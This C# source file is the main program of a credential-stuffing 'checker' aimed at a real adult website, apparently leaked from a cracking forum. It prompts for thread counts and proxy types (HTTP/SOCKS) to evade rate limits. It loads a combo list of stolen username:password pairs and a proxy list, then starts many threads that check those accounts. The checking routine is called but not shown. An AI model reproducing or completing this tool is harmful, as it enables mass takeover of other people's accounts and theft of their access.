using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PornHubChecker
{
  internal class Program
  {
    [STAThread]
    private static void Main(string[] args)
    {
      ServicePointManager.DefaultConnectionLimit = 100000000;
      Colorful.Console.SetWindowSize(35, 35);
      Colorful.Console.Title = Colorful.Console.Title = "  [ ProHub | PornHub Checker | Made by ThieX | https://cracked.to/ThieX | Code Leaked By Lil_Eye]";
      Colorful.Console.Clear();
      Colorful.Console.WriteLine();
      Colorful.Console.Write("                                                      ██╗                                                    \n", Color.DarkRed);
      Colorful.Console.Write("                                                       ██╗                                                   \n", Color.DarkRed);
      Colorful.Console.Write("                                                        ██╗                                                  \n", Color.DarkRed);
      Colorful.Console.Write("                              ░░██████╗░██████╗░░██████░░██╗██╗░░╔██╗██╗░░░░╔██╗██████╗░░░               \n", Color.DarkRed);
      Colorful.Console.Write("                              ░░██╔══██░██╔══██╗██░░░░█████║██╚══╝██║██║░░░░║██║██╔══██╗░░               \n", Color.White);
      Colorful.Console.Write("                              ░░██████╗░██████╔╝██░░░░████╔╝████████║██╚╗░░╔╝██║██████╔╝░░               \n", Color.White);
      Colorful.Console.Write("                              ░░██╔═══╝░██╔══██╗██░░░░███╔╝░██╔══╗██║╚██╚══╝██╔╝██╔══██░░░               \n", Color.LawnGreen);
      Colorful.Console.Write("                              ░░██║░░░░░██║░░██║╔███████╔╝░░██║░░║██║░╚██████╔╝░██████╗░░░               \n", Color.LawnGreen);
      Colorful.Console.Write("                              ░░╚═╝░░░░░╚═╝░░╚═╝╚═══════╝░░░╚═╝░░╚══╝░░╚═════╝░░╚═════╝░░░               \n", Color.LawnGreen);
      System.Console.WriteLine();
      Colorful.Console.WriteLine("                                               ╔═══════════════════════╗                                                        ", Color.DarkSalmon);
      Colorful.Console.WriteLine("                                               ║   LEAKED BY Lil_Eye   ║                                                        ", Color.DarkSalmon);
      Colorful.Console.WriteLine("                                               ╚═══════════════════════╝                                                        ", Color.DarkSalmon);
      System.Console.WriteLine();
      Colorful.Console.WriteLine();
      Thread.Sleep(250);
      Colorful.Console.Write(DateTime.Now.ToString("                                          [dddd | yyyy-MM-dd | HH-mm-ss]"), Color.Aquamarine);
      System.Console.WriteLine();
      System.Console.WriteLine();
      Colorful.Console.Write(" ~ How many ", Color.GreenYellow);
      Colorful.Console.Write("THREADS", Color.IndianRed);
      Colorful.Console.Write(" you want to use", Color.GreenYellow);
      Colorful.Console.Write(": ", Color.GreenYellow);
      try
      {
        CheckerHelper.threads = int.Parse(Colorful.Console.ReadLine());
      }
      catch
      {
        CheckerHelper.threads = 100;
      }
      System.Console.WriteLine();
      while (true)
      {
        Colorful.Console.Write(" ~ What type of ", Color.GreenYellow);
        Colorful.Console.Write("BROXIES ", Color.IndianRed);
        Colorful.Console.Write("do you wanna use? [ HTTP | SOCKS4 | SOCKS5 | PROXYLESS (BUT USE PROXIES FOR FASTER CHECK) ]", Color.GreenYellow);
        Colorful.Console.WriteLine(": ", Color.GreenYellow);
        CheckerHelper.proxytype = Colorful.Console.ReadLine();
        CheckerHelper.proxytype = CheckerHelper.proxytype.ToUpper();
        if ((CheckerHelper.proxytype == "HTTP" || (CheckerHelper.proxytype == "SOCKS4" || CheckerHelper.proxytype == "SOCKS5") ? 1 : (CheckerHelper.proxytype == "PROXYLESS" ? 1 : 0)) == 0)
        {
          System.Console.WriteLine();
          Colorful.Console.Write(" Dude...stop joking and select a broxie type -.-' \n\n", Color.Red);
          Thread.Sleep(1200);
        }
        else
          break;
      }
      Task.Factory.StartNew((Action) (() => CheckerHelper.UpdateTitle()));
      Colorful.Console.WriteLine();
      OpenFileDialog openFileDialog = new OpenFileDialog();
      string fileName1;
      do
      {
        Colorful.Console.Write(" ~ Load Your", Color.DarkGoldenrod);
        Colorful.Console.Write(" WOMBOS ", Color.Gold);
        Thread.Sleep(500);
        openFileDialog.Title = "Select Your Wombolist";
        openFileDialog.DefaultExt = "txt";
        openFileDialog.Filter = "Text files|*.txt";
        openFileDialog.RestoreDirectory = true;
        int num = (int) openFileDialog.ShowDialog();
        fileName1 = openFileDialog.FileName;
      }
      while (!System.IO.File.Exists(fileName1));
      CheckerHelper.accounts = new List<string>((IEnumerable<string>) System.IO.File.ReadAllLines(fileName1));
      CheckerHelper.LoadCombos(fileName1);
      if (CheckerHelper.proxytype != "PROXYLESS")
      {
        string fileName2;
        do
        {
          System.Console.WriteLine();
          System.Console.WriteLine();
          Colorful.Console.Write(" ~ Load Your", Color.DarkGoldenrod);
          Colorful.Console.Write(" BROXIES ", Color.Gold);
          Thread.Sleep(500);
          openFileDialog.Title = "Select Your Broxies";
          openFileDialog.DefaultExt = "txt";
          openFileDialog.Filter = "Text files|*.txt";
          openFileDialog.RestoreDirectory = true;
          int num = (int) openFileDialog.ShowDialog();
          fileName2 = openFileDialog.FileName;
        }
        while (!System.IO.File.Exists(fileName2));
        CheckerHelper.proxies = new List<string>((IEnumerable<string>) System.IO.File.ReadAllLines(fileName2));
        CheckerHelper.LoadProxies(fileName2);
      }
      System.Console.WriteLine();
      Colorful.Console.Write("                                   [ ", Color.Gainsboro);
      Colorful.Console.Write("Total Wombos: ", Color.Firebrick);
      Colorful.Console.Write(CheckerHelper.total.ToString() + " ", Color.Firebrick);
      Colorful.Console.Write(" / ", Color.Gainsboro);
      Colorful.Console.Write("Total Broxies: ", Color.Firebrick);
      Colorful.Console.Write(CheckerHelper.proxytotal, Color.Firebrick);
      Colorful.Console.Write(" ]\n ", Color.Gainsboro);
      Thread.Sleep(3500);
      for (int index = 1; index <= CheckerHelper.threads; ++index)
        new Thread(new ThreadStart(CheckerHelper.Check)).Start();
      Colorful.Console.ReadLine();
      Environment.Exit(0);
    }
  }
}
